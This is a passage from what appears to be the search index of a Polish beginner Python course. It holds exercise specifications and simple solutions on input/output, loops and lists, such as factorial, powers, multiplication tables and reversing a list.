b\nmod = a % b\n\nprint(f\"{a} / {b} = {div}, r. {mod}\")\n</code></pre>"},{"location":"programming/python/exercises/input-output/solution-5/","title":"Rozwi\u0105zanie 5","text":""},{"location":"programming/python/exercises/input-output/solution-5/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/input-output/solution-5/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/input-output/solution-5/#dane","title":"Dane","text":"<ul> <li>\\(a\\) - liczba naturalna</li> </ul>"},{"location":"programming/python/exercises/input-output/solution-5/#wynik","title":"Wynik","text":"<ul> <li>Pierwiastek z \\(a\\)</li> </ul>"},{"location":"programming/python/exercises/input-output/solution-5/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>import math\n\na = int(input(\"Podaj liczb\u0119 naturaln\u0105: \"))\n\npierwiastek = math.sqrt(a)\n\nprint(f\"Pierwiastek z {a} = {pierwiastek}\")\n</code></pre>"},{"location":"programming/python/exercises/input-output/solution-6/","title":"Rozwi\u0105zanie 6","text":""},{"location":"programming/python/exercises/input-output/solution-6/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Wykorzystaj funkcj\u0119 min.</p>"},{"location":"programming/python/exercises/input-output/solution-6/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/input-output/solution-6/#dane","title":"Dane","text":"<ul> <li>\\(a, b\\) - dwie liczby ca\u0142kowite</li> </ul>"},{"location":"programming/python/exercises/input-output/solution-6/#wynik","title":"Wynik","text":"<ul> <li>Mniejsza z liczb \\(a\\) i \\(b\\), lub dowolna gdy s\u0105 sobie r\u00f3wne</li> </ul>"},{"location":"programming/python/exercises/input-output/solution-6/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>a = int(input(\"Podaj pierwsz\u0105 liczb\u0119: \"))\nb = int(input(\"Podaj drug\u0105 liczb\u0119: \"))\n\nwynik = min(a, b)\n\nprint(f\"Minimum z {a} i {b} wynosi {wynik}\")\n</code></pre>"},{"location":"programming/python/exercises/input-output/solution-7/","title":"Rozwi\u0105zanie 7","text":""},{"location":"programming/python/exercises/input-output/solution-7/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Wykorzystaj funkcj\u0119 max.</p>"},{"location":"programming/python/exercises/input-output/solution-7/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/input-output/solution-7/#dane","title":"Dane","text":"<ul> <li>\\(a, b, c\\) - trzy liczby ca\u0142kowite</li> </ul>"},{"location":"programming/python/exercises/input-output/solution-7/#wynik","title":"Wynik","text":"<ul> <li>Najwi\u0119ksza z liczb \\(a\\), \\(b\\) i \\(c\\), lub dowolna gdy s\u0105 sobie r\u00f3wne</li> </ul>"},{"location":"programming/python/exercises/input-output/solution-7/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>a = int(input(\"Podaj pierwsz\u0105 liczb\u0119: \"))\nb = int(input(\"Podaj drug\u0105 liczb\u0119: \"))\nc = int(input(\"Podaj trzeci\u0105 liczb\u0119: \"))\n\nwynik = max(a, b, c)\n\nprint(f\"Maksimum z {a}, {b} i {c} wynosi {wynik}\")\n</code></pre>"},{"location":"programming/python/exercises/input-output/solution-8/","title":"Rozwi\u0105zanie 8","text":""},{"location":"programming/python/exercises/input-output/solution-8/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/input-output/solution-8/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/input-output/solution-8/#dane","title":"Dane","text":"<ul> <li>\\(sekundy\\) - liczba naturalna</li> </ul>"},{"location":"programming/python/exercises/input-output/solution-8/#wynik","title":"Wynik","text":"<ul> <li>Czas podany w czytelnej formie ** **\\(H:M:S\\) (\\(H\\) - godziny, \\(M\\) - minuty, \\(S\\) - sekundy)</li> </ul>"},{"location":"programming/python/exercises/input-output/solution-8/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>sekundy = int(input(\"Podaj liczb\u0119 sekund: \"))\n\ngodziny = sekundy // (60 * 60)\n\nsekundy = sekundy % (60 * 60)\n\nminuty = sekundy // 60\n\nsekundy = sekundy % 60\n\nprint(f\"{godziny}:{minuty}:{sekundy}\")\n</code></pre>"},{"location":"programming/python/exercises/iterative-loop/","title":"P\u0119tla iteracyjna","text":""},{"location":"programming/python/exercises/iterative-loop/#zadanie-1","title":"Zadanie 1","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/iterative-loop/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/iterative-loop/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"programming/python/exercises/iterative-loop/#wynik","title":"Wynik","text":"<ul> <li>\\(n!\\) </li> </ul>"},{"location":"programming/python/exercises/iterative-loop/#zadanie-2","title":"Zadanie 2","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Nie korzystaj z operatora <code>**</code>.</p>"},{"location":"programming/python/exercises/iterative-loop/#specyfikacja_1","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/iterative-loop/#dane_1","title":"Dane","text":"<ul> <li>\\(a, n\\) - dwie liczby naturalne</li> </ul>"},{"location":"programming/python/exercises/iterative-loop/#wynik_1","title":"Wynik","text":"<ul> <li>\\(a^n\\) </li> </ul>"},{"location":"programming/python/exercises/iterative-loop/#zadanie-3","title":"Zadanie 3","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/iterative-loop/#specyfikacja_2","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/iterative-loop/#dane_2","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> <li>\\(n\\)liczb ca\u0142kowitych</li> </ul>"},{"location":"programming/python/exercises/iterative-loop/#wynik_2","title":"Wynik","text":"<ul> <li>Suma podanych \\(n\\) liczb</li> </ul>"},{"location":"programming/python/exercises/iterative-loop/#zadanie-4","title":"Zadanie 4","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/iterative-loop/#specyfikacja_3","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/iterative-loop/#dane_3","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna, wi\u0119ksza od \\(0\\) </li> <li>\\(n\\)liczb naturalnych</li> </ul>"},{"location":"programming/python/exercises/iterative-loop/#wynik_3","title":"Wynik","text":"<ul> <li>Najwi\u0119ksza z podanych \\(n\\) liczb</li> </ul>"},{"location":"programming/python/exercises/iterative-loop/#zadanie-5","title":"Zadanie 5","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/iterative-loop/#specyfikacja_4","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/iterative-loop/#dane_4","title":"Dane","text":"<ul> <li>\\(n, k\\) - liczby naturalne, wi\u0119ksze od zera</li> <li>\\(n\\) liczb naturalnych</li> </ul>"},{"location":"programming/python/exercises/iterative-loop/#wynik_4","title":"Wynik","text":"<ul> <li>Ilo\u015b\u0107 liczb podzielnych przez \\(k\\) z podanych \\(n\\) liczb</li> </ul>"},{"location":"programming/python/exercises/iterative-loop/#zadanie-6","title":"Zadanie 6","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/iterative-loop/#specyfikacja_5","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/iterative-loop/#dane_5","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"programming/python/exercises/iterative-loop/#wynik_5","title":"Wynik","text":"<ul> <li>Tabliczka mno\u017cenia z zakresu \\([1,n]\\)</li> </ul>"},{"location":"programming/python/exercises/iterative-loop/#zadanie-7","title":"Zadanie 7","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/iterative-loop/#specyfikacja_6","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/iterative-loop/#dane_6","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"programming/python/exercises/iterative-loop/#wynik_6","title":"Wynik","text":"<ul> <li>Wszystkie pary liczb naturalnych, kt\u00f3rych suma wynosi \\(n\\)</li> </ul>"},{"location":"programming/python/exercises/iterative-loop/#przykad","title":"Przyk\u0142ad","text":""},{"location":"programming/python/exercises/iterative-loop/#dane_7","title":"Dane","text":"<pre><code>n := 4\n</code></pre> <p>Wynik: \\((0, 4), (1, 3), (2, 2)\\)</p>"},{"location":"programming/python/exercises/iterative-loop/#zadanie-8","title":"Zadanie 8","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/iterative-loop/#specyfikacja_7","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/iterative-loop/#dane_8","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"programming/python/exercises/iterative-loop/#wynik_7","title":"Wynik","text":"<ul> <li>Wszystkie tr\u00f3jki liczb naturalnych, kt\u00f3rych suma wynosi \\(n\\)</li> </ul>"},{"location":"programming/python/exercises/iterative-loop/#przykad_1","title":"Przyk\u0142ad","text":""},{"location":"programming/python/exercises/iterative-loop/#dane_9","title":"Dane","text":"<pre><code>n := 4\n</code></pre> <p>Wynik: \\((0, 0, 4), (0, 1, 3), (0, 2, 2), (1, 1, 2)\\)</p>"},{"location":"programming/python/exercises/iterative-loop/solution-1/","title":"Rozwi\u0105zanie 1","text":""},{"location":"programming/python/exercises/iterative-loop/solution-1/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/iterative-loop/solution-1/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/iterative-loop/solution-1/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"programming/python/exercises/iterative-loop/solution-1/#wynik","title":"Wynik","text":"<ul> <li>\\(n!\\) </li> </ul>"},{"location":"programming/python/exercises/iterative-loop/solution-1/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>n = int(input(\"Podaj liczb\u0119 naturaln\u0105: \"))\n\nsilnia = 1\n\nfor i in range(2, n + 1):\n    silnia *= i\n\nprint(f\"{n}! = {silnia}\")\n</code></pre>"},{"location":"programming/python/exercises/iterative-loop/solution-2/","title":"Rozwi\u0105zanie 2","text":""},{"location":"programming/python/exercises/iterative-loop/solution-2/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105. Nie korzystaj z operatora <code>**</code>.</p>"},{"location":"programming/python/exercises/iterative-loop/solution-2/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/iterative-loop/solution-2/#dane","title":"Dane","text":"<ul> <li>\\(a, n\\) - dwie liczby naturalne</li> </ul>"},{"location":"programming/python/exercises/iterative-loop/solution-2/#wynik","title":"Wynik","text":"<ul> <li>\\(a^n\\) </li> </ul>"},{"location":"programming/python/exercises/iterative-loop/solution-2/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>a = int(input(\"Podaj pierwsz\u0105 liczb\u0119: \"))\nn = int(input(\"Podaj drug\u0105 liczb\u0119: \"))\n\nwynik = 1\n\nfor i in range(n):\n    wynik *= a\n\nprint(f\"{a} do {n} = {wynik}\")\n</code></pre>"},{"location":"programming/python/exercises/iterative-loop/solution-3/","title":"Rozwi\u0105zanie 3","text":""},{"location":"programming/python/exercises/iterative-loop/solution-3/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/iterative-loop/solution-3/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/iterative-loop/solution-3/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> <li>\\(n\\) liczb ca\u0142kowitych</li> </ul>"},{"location":"programming/python/exercises/iterative-loop/solution-3/#wynik","title":"Wynik","text":"<ul> <li>Suma podanych \\(n\\) liczb</li> </ul>"},{"location":"programming/python/exercises/iterative-loop/solution-3/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>n = int(input(\"Podaj liczb\u0119 warto\u015bci: \"))\n\nsuma = 0\n\nfor i in range(n):\n    liczba = int(input(f\"Podaj liczb\u0119 nr {i + 1}: \"))\n    suma += liczba\n\nprint(f\"Suma podanych liczb wynosi {suma}\")\n</code></pre>"},{"location":"programming/python/exercises/iterative-loop/solution-4/","title":"Rozwi\u0105zanie 4","text":""},{"location":"programming/python/exercises/iterative-loop/solution-4/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/iterative-loop/solution-4/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/iterative-loop/solution-4/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna, wi\u0119ksza od \\(0\\) </li> <li>\\(n\\)liczb naturalnych</li> </ul>"},{"location":"programming/python/exercises/iterative-loop/solution-4/#wynik","title":"Wynik","text":"<ul> <li>Najwi\u0119ksza z podanych \\(n\\) liczb</li> </ul>"},{"location":"programming/python/exercises/iterative-loop/solution-4/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>n = int(input(\"Podaj liczb\u0119 warto\u015bci: \"))\n\nmaks = -1\n\nfor i in range(n):\n    liczba = int(input(f\"Podaj liczb\u0119 nr {i + 1}: \"))\n    if liczba &gt; maks:\n        maks = liczba\n\nprint(f\"Maksimum z podanych liczb wynosi {maks}\")\n</code></pre>"},{"location":"programming/python/exercises/iterative-loop/solution-4/#rozwiazanie-alternatywne","title":"Rozwi\u0105zanie alternatywne","text":"<pre><code>n = int(input(\"Podaj liczb\u0119 warto\u015bci: \"))\n\nmaks = -1\n\nfor i in range(n):\n    liczba = int(input(f\"Podaj liczb\u0119 nr {i + 1}: \"))\n    maks = max(maks, liczba)\n\nprint(f\"Maksimum z podanych liczb wynosi {maks}\")\n</code></pre>"},{"location":"programming/python/exercises/iterative-loop/solution-5/","title":"Rozwi\u0105zanie 5","text":""},{"location":"programming/python/exercises/iterative-loop/solution-5/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/iterative-loop/solution-5/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/iterative-loop/solution-5/#dane","title":"Dane","text":"<ul> <li>\\(n, k\\) - liczby naturalne, wi\u0119ksze od zera</li> <li>\\(n\\) liczb naturalnych</li> </ul>"},{"location":"programming/python/exercises/iterative-loop/solution-5/#wynik","title":"Wynik","text":"<ul> <li>Ilo\u015b\u0107 liczb podzielnych przez \\(k\\) z podanych \\(n\\) liczb</li> </ul>"},{"location":"programming/python/exercises/iterative-loop/solution-5/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>n = int(input(\"Podaj liczb\u0119 warto\u015bci: \"))\nk = int(input(\"Podaj dzielnik: \"))\n\npodzielne = 0\n\nfor i in range(n):\n    liczba = int(input(f\"Podaj liczb\u0119 nr {i + 1}: \"))\n    if liczba % k == 0:\n        podzielne += 1\n\nprint(f\"Podzielne: {podzielne}\")\n</code></pre>"},{"location":"programming/python/exercises/iterative-loop/solution-6/","title":"Rozwi\u0105zanie 6","text":""},{"location":"programming/python/exercises/iterative-loop/solution-6/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/iterative-loop/solution-6/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/iterative-loop/solution-6/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"programming/python/exercises/iterative-loop/solution-6/#wynik","title":"Wynik","text":"<ul> <li>Tabliczka mno\u017cenia z zakresu \\([1,n]\\)</li> </ul>"},{"location":"programming/python/exercises/iterative-loop/solution-6/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>n = int(input(\"Podaj liczb\u0119 naturaln\u0105: \"))\n\nfor i in range(1, n + 1):\n    for j in range(1, n + 1):\n        print(i * j, end=\" \")\n\n    print()\n</code></pre>"},{"location":"programming/python/exercises/iterative-loop/solution-7/","title":"Rozwi\u0105zanie 7","text":""},{"location":"programming/python/exercises/iterative-loop/solution-7/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/iterative-loop/solution-7/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/iterative-loop/solution-7/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"programming/python/exercises/iterative-loop/solution-7/#wynik","title":"Wynik","text":"<ul> <li>Wszystkie pary liczb naturalnych, kt\u00f3rych suma wynosi \\(n\\)</li> </ul>"},{"location":"programming/python/exercises/iterative-loop/solution-7/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>n = int(input(\"Podaj liczb\u0119 naturaln\u0105: \"))\n\nfor i in range((n // 2) + 1):\n    print(f\"({i}, {n - i})\")\n</code></pre>"},{"location":"programming/python/exercises/iterative-loop/solution-8/","title":"Rozwi\u0105zanie 8","text":""},{"location":"programming/python/exercises/iterative-loop/solution-8/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/iterative-loop/solution-8/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/iterative-loop/solution-8/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"programming/python/exercises/iterative-loop/solution-8/#wynik","title":"Wynik","text":"<ul> <li>Wszystkie tr\u00f3jki liczb naturalnych, kt\u00f3rych suma wynosi \\(n\\)</li> </ul>"},{"location":"programming/python/exercises/iterative-loop/solution-8/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>n = int(input(\"Podaj liczb\u0119 naturaln\u0105: \"))\n\nfor i in range((n // 3) + 1):\n    for j in range(i, ((n - i) // 2) + 1):\n        print(f\"({i}, {j}, {n - i - j})\")\n</code></pre>"},{"location":"programming/python/exercises/lists/","title":"Tablice statyczne","text":""},{"location":"programming/python/exercises/lists/#zadanie-1","title":"Zadanie 1","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/lists/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/lists/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> <li>\\(a_1,a_2,\\dots,a_n\\) - \\(n\\) liczb ca\u0142kowitych</li> </ul>"},{"location":"programming/python/exercises/lists/#wynik","title":"Wynik","text":"<ul> <li>\\(a_n,a_{n-1},\\dots,a_2,a_1\\) - podane liczby w odwrotnej kolejno\u015bci</li> </ul>"},{"location":"programming/python/exercises/lists/#przykad","title":"Przyk\u0142ad","text":""},{"location":"programming/python/exercises/lists/#dane_1","title":"Dane","text":"<pre><code>n := 5\na1 := 1\na2 := 2\na3 := 3\na4 := 4\na5 := 5\n</code></pre> <p>Wynik: \\(5, 4, 3, 2, 1\\) </p>"},{"location":"programming/python/exercises/lists/#zadanie-2","title":"Zadanie 2","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/lists/#specyfikacja_1","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/lists/#dane_2","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> <li>\\(a_1,a_2,\\dots,a_n\\) - \\(n\\) liczb ca\u0142kowitych</li> <li>\\(k\\) - liczba naturalna, \\(1&lt;=k&lt;=n\\)</li> </ul>"},{"location":"programming/python/exercises/lists/#wynik_1","title":"Wynik","text":"<ul> <li>\\(a_k\\) - \\(k\\)-ta podana liczba</li> </ul>"},{"location":"programming/python/exercises/lists/#przykad_1","title":"Przyk\u0142ad","text":""},{"location":"programming/python/exercises/lists/#dane_3","title":"Dane","text":"<pre><code>n := 5\n\na1 := 8\na2 := 3\na3 := 9\na4 := 1\na5 := 2\n\nk := 3\n</code></pre> <p>Wynik: \\(9\\) </p> <p>Info</p> <p>Wyja\u015bnienie</p> <p>\\(k := 3\\), a trzecia podana warto\u015b\u0107 wynosi \\(9\\) (a3 := 9). </p>"},{"location":"programming/python/exercises/lists/#zadanie-3","title":"Zadanie 3","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/lists/#specyfikacja_2","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/lists/#dane_4","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> <li>\\(a_1,a_2,\\dots,a_n\\) - \\(n\\) liczb ca\u0142kowitych</li> <li>\\(p, k\\) - dwie liczby naturalna, \\(1&lt;=p,k&lt;=n\\), \\(p &lt;= k\\)</li> </ul>"},{"location":"programming/python/exercises/lists/#wynik_2","title":"Wynik","text":"<ul> <li>\\(a_p+a_{p+1}+a_{p+2}+...+a_{k}\\) - suma warto\u015bci na pozycjach od \\(p\\) do \\(k\\)</li> </ul>"},{"location":"programming/python/exercises/lists/#przykad_2","title":"Przyk\u0142ad","text":""},{"location":"programming/python/exercises/lists/#dane_5","title":"Dane","text":"<pre><code>n := 5\n\na1 := 8\na2 := 3\na3 := 9\na4 := 1\na5 := 2\n\np := 3\nk := 5\n</code></pre> <p>Wynik: \\(12\\) </p> <p>Info</p> <p>Wyja\u015bnienie</p> <p>\\(a_3+a_4+a_5=9+1+2=12\\)</p>"},{"location":"programming/python/exercises/lists/#zadanie-4","title":"Zadanie 4","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/lists/#specyfikacja_3","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/lists/#dane_6","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> <li>\\(t1[n],\\ t2[n]\\) - dwie listy liczb ca\u0142kowitych</li> </ul>"},{"location":"programming/python/exercises/lists/#wynik_3","title":"Wynik","text":"<ul> <li>Tablica powsta\u0142a poprzez dodanie do siebie warto\u015bci z list \\(t1\\) i \\(t2\\) </li> </ul>"},{"location":"programming/python/exercises/lists/#przykad_3","title":"Przyk\u0142ad","text":""},{"location":"programming/python/exercises/lists/#dane_7","title":"Dane","text":"<pre><code>n := 5\nt1 := [4, 1, 7, 0, 2]\nt2 := [2, 3, 1, 9, 6]\n</code></pre> <p>Wynik: \\(6, 4, 8, 9, 8\\) </p> <p>Info</p> <p>Wyja\u015bnienie</p> <p>\\([4+2,\\ 1+3,\\ 7+1,\\ 0+9,\\ 2+6]\\) </p>"},{"location":"programming/python/exercises/lists/#zadanie-5","title":"Zadanie 5","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/lists/#specyfikacja_4","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/lists/#dane_8","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna, \\(n&gt;2\\)</li> </ul>"},{"location":"programming/python/exercises/lists/#wynik_4","title":"Wynik","text":"<ul> <li>\\(fib[n]\\) - lista zawieraj\u0105ca \\(n\\) kolejnych liczb Fibonacciego</li> </ul>"},{"location":"programming/python/exercises/lists/#przykad_4","title":"Przyk\u0142ad","text":""},{"location":"programming/python/exercises/lists/#dane_9","title":"Dane","text":"<pre><code>n := 6\n</code></pre> <p>Wynik: \\(1, 1, 2, 3, 5, 8\\) </p>"},{"location":"programming/python/exercises/lists/#zadanie-6","title":"Zadanie 6","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/lists/#specyfikacja_5","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/lists/#dane_10","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"programming/python/exercises/lists/#wynik_5","title":"Wynik","text":"<ul> <li>\\(mno[n][n]\\) - dwuwymiarowa lista reprezentuj\u0105ca tabliczk\u0119 mno\u017cenia liczb z zakresu \\([0,n-1]\\), gdzie \\(mno[i][j]=i*j\\)</li> </ul>"},{"location":"programming/python/exercises/lists/#przykad_5","title":"Przyk\u0142ad","text":""},{"location":"programming/python/exercises/lists/#dane_11","title":"Dane","text":"<pre><code>n := 3\n</code></pre>"},{"location":"programming/python/exercises/lists/#wynik_6","title":"Wynik","text":"<pre><code>mno := [[0, 0, 0],\n        [0, 1, 2],\n        [0, 2, 4]]\n</code></pre>"},{"location":"programming/python/exercises/lists/#zadanie-7","title":"Zadanie 7","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/lists/#specyfikacja_6","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/lists/#dane_12","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> <li>\\(tab[n]\\) - lista liczb ca\u0142kowitych</li> </ul>"},{"location":"programming/python/exercises/lists/#wynik_7","title":"Wynik","text":"<ul> <li>Komunikat \"niemalejaco\" je\u017celi elementy listy posortowane s\u0105 niemalej\u0105co</li> <li>Komunikat \"nierosnaco\" je\u017celi elementy listy posortowane s\u0105 nierosn\u0105co</li> <li>Komunikat \"nieposortowane\" je\u017celi elementy listy nie s\u0105 posortowane</li> </ul>"},{"location":"programming/python/exercises/lists/#przykad-1","title":"Przyk\u0142ad 1","text":""},{"location":"programming/python/exercises/lists/#dane_13","title":"Dane","text":"<pre><code>n := 5\ntab := [1, 1, 5, 6, 8]\n</code></pre> <p>Wynik: \"niemalej\u0105co\"</p>"},{"location":"programming/python/exercises/lists/#przykad-2","title":"Przyk\u0142ad 2","text":""},{"location":"programming/python/exercises/lists/#dane_14","title":"Dane","text":"<pre><code>n := 5\ntab := [8, 5, 5, 3, 1]\n</code></pre> <p>Wynik: \"nierosn\u0105co\"</p>"},{"location":"programming/python/exercises/lists/#przykad-3","title":"Przyk\u0142ad 3","text":""},{"location":"programming/python/exercises/lists/#dane_15","title":"Dane","text":"<pre><code>n := 5\ntab := [1, 2, 3, 1, 5]\n</code></pre> <p>Wynik: \"nieposortowane\"</p>"},{"location":"programming/python/exercises/lists/#zadanie-8","title":"Zadanie 8","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/lists/#specyfikacja_7","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/lists/#dane_16","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> <li>\\(p, k\\) - dwie liczby naturalna, \\(p &lt;= k\\)</li> </ul>"},{"location":"programming/python/exercises/lists/#wynik_8","title":"Wynik","text":"<ul> <li>\\(n\\)-elementowa lista wype\u0142niona losowymi warto\u015bciami z przedzia\u0142u \\([p, k]\\)</li> </ul>"},{"location":"programming/python/exercises/lists/solution-1/","title":"Rozwi\u0105zanie 1","text":""},{"location":"programming/python/exercises/lists/solution-1/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz program zgodny z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"programming/python/exercises/lists/solution-1/#specyfikacja","title":"Specyfikacja","text":""},{"location":"programming/python/exercises/lists/solution-1/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> <li>\\(a_1,a_2,\\dots,a_n\\) - \\(n\\) liczb ca\u0142kowitych</li> </ul>"},{"location":"programming/python/exercises/lists/solution-1/#wynik","title":"Wynik","text":"<ul> <li>\\(a_n,a_{n-1},\\dots,a_2,a_1\\) - podane liczby w odwrotnej kolejno\u015bci</li> </ul>"},{"location":"programming/python/exercises/lists/solution-1/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>n = int(input(\"Podaj liczb\u0119 warto\u015bci: \"))\ntab = [int(input(f\"Podaj liczb\u0119 nr {i + 1}: \")) for i in range(n)]\n\ntab.reverse()\n\nprint(tab)\n</code></pre>"},{"location":"programming/python/exercises/lists/solution-1/#opis-rozwiazania","title":"Opis rozwi\u0105zania","text":"<p>Na pocz\u0105tku wczytujemy od u\u017cytkownika liczb\u0119 element\u00f3w i zapisujemy j\u0105 w zmiennej \\(n\\) (linia 1).</p> <p>Nast\u0119pnie tworzymy list\u0119 wczytuj\u0105c do niej warto\u015bci (linia 2).</p> <p>Ostatnim etapem rozwi\u0105zania jest odwr\u00f3cenie kolejno\u015bci element\u00f3w listy za pomoc\u0105 polecenia <code>reverse</code> (linia 4). Na ko\u0144cu wypisujemy odwr\u00f3con\u0105 list\u0119 (linia 6).</p>"},{"location":"programming/python/exercises/lists/solution-2/","title":"Rozwi\u0105zanie 